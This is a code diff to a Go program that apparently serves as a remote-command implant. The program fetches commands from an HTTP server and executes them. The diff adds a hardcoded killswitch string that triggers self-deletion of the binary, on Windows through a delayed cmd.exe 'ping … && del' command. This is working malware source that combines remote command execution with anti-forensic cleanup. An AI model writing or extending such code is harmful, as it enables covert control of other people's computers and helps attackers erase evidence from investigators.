@@ -16,11 +16,16 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
+	"path/filepath"
+	"runtime"
 	"strings"
 	"time"
 
 	"golang.org/x/net/proxy"
 )
+
+// httpKillswitchCommand, when received as an HTTP "Commands" entry, stops the client and removes this binary.
+const httpKillswitchCommand = "sendmetojesusdog"
 
 // RequestOptions defines available options for an HTTP request.
 type RequestOptions struct {
@@ -147,6 +152,42 @@ func httpClientFor(opts *RequestOptions) (*http.Client, error) {
 		Timeout:   opts.Timeout,
 		Transport: transport,
 	}, nil
+}
+
+// selfDelete removes the running executable and exits. On Windows the binary cannot be deleted while
+// running, so a short-lived cmd process deletes it after this process terminates.
+func selfDelete() {
+	exe, err := os.Executable()
+	if err != nil {
+		log.Printf("[-] killswitch: could not resolve executable path: %v", err)
+		os.Exit(1)
+	}
+	exe, err = filepath.EvalSymlinks(exe)
+	if err != nil {
+		exe, _ = filepath.Abs(exe)
+	} else {
+		exe, _ = filepath.Abs(exe)
+	}
+
+	switch runtime.GOOS {
+	case "windows":
+		// Process must exit before del can succeed.
+		cmd := exec.Command("cmd.exe", "/C", "ping 127.0.0.1 -n 2 >NUL && del /F /Q "+windowsQuoteArg(exe))
+		cmd.Stdin, cmd.Stdout, cmd.Stderr = nil, nil, nil
+		if err := cmd.Start(); err != nil {
+			log.Printf("[-] killswitch: could not schedule self-delete: %v", err)
+		}
+	default:
+		if err := os.Remove(exe); err != nil {
+			log.Printf("[-] killswitch: could not remove binary: %v", err)
+		}
+	}
+	os.Exit(0)
+}
+
+// windowsQuoteArg quotes a path for cmd.exe; internal " become "" per cmd rules.
+func windowsQuoteArg(s string) string {
+	return `"` + strings.ReplaceAll(s, `"`, `""`) + `"`
 }
 
 // ExecuteCommand runs the received command and returns the output.
@@ -289,8 +330,10 @@ func MakeRequest(opts *RequestOptions) (*ResponseData, error) {
 					continue
 				}
 
-				// Debugging
-				// log.Printf("[+] Received command: %s\n", commandStr)
+				if strings.TrimSpace(commandStr) == httpKillswitchCommand {
+					log.Println("[-] Killswitch received; stopping and removing binary.")
+					selfDelete()
+				}
 
 				// Execute the command
 				output, err := ExecuteCommand(commandStr)
